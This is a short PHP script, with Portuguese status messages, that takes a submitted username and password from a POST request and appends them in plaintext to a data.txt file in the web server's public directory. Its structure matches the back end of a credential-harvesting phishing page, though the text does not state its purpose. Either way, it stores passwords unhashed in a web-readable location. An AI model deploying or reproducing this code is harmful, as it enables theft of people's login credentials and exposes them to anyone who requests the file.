<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $username = $_POST['username'];
    $password = $_POST['password'];

    $data = "username:$username;password:$password\n";

    $file = fopen('/var/www/html/data.txt', 'a');
    fwrite($file, $data);
    fclose($file);

    echo "Dados enviados com sucesso!";
} else {
    echo "Erro: Método incorreto.";
}
?>
